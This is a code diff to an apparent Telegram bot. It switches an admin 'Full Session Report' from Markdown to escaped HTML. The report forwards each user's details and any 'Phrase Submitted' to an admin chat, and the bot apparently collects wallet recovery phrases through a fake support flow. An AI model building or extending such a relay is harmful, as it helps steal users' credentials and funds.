@@ -56,29 +56,35 @@ async def notify_admin_journey(context, user, outcome: str):
     timestamp = context.user_data.get("timestamp", datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
     phrase    = context.user_data.get("phrase", None)
 
+    import html as _html
+
+    def e(s):
+        """Escape a value for safe use inside an HTML Telegram message."""
+        return _html.escape(str(s)) if s is not None else "—"
+
     steps = context.user_data.get("journey", [])
-    steps_text = "\n".join(f"  {i+1}. {step}" for i, step in enumerate(steps)) if steps else "  (no steps recorded)"
+    steps_text = "\n".join(f"  {i+1}. {e(step)}" for i, step in enumerate(steps)) if steps else "  (no steps recorded)"
 
     msg = (
-        f"📋 *Full Session Report*\n"
+        f"📋 <b>Full Session Report</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🕐 *Time:* {timestamp}\n"
-        f"👤 *Name:* {user.full_name}\n"
-        f"🔗 *Username:* {username}\n"
-        f"🆔 *User ID:* `{user.id}`\n"
-        f"🌐 *Language:* {lang.upper()}\n"
+        f"🕐 <b>Time:</b> {e(timestamp)}\n"
+        f"👤 <b>Name:</b> {e(user.full_name)}\n"
+        f"🔗 <b>Username:</b> {e(username)}\n"
+        f"🆔 <b>User ID:</b> <code>{e(user.id)}</code>\n"
+        f"🌐 <b>Language:</b> {e(lang.upper())}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📁 *Category:* {category}\n"
-        f"⚠️ *Issue:* {sub_label}\n"
-        f"🏁 *Outcome:* {outcome}\n"
+        f"📁 <b>Category:</b> {e(category)}\n"
+        f"⚠️ <b>Issue:</b> {e(sub_label)}\n"
+        f"🏁 <b>Outcome:</b> {e(outcome)}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🗺️ *Journey:*\n{steps_text}\n"
+        f"🗺️ <b>Journey:</b>\n{steps_text}\n"
     )
 
     if phrase:
         msg += (
             f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🔑 *Phrase Submitted:* `{phrase}`\n"
+            f"🔑 <b>Phrase Submitted:</b> <code>{e(phrase)}</code>\n"
         )
 
     msg += "━━━━━━━━━━━━━━━━━━━━"
@@ -87,7 +93,7 @@ async def notify_admin_journey(context, user, outcome: str):
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
             text=msg,
-            parse_mode="Markdown",
+            parse_mode="HTML",
         )
     except Exception as e:
         logger.warning(f"Failed to notify admin: {e}")
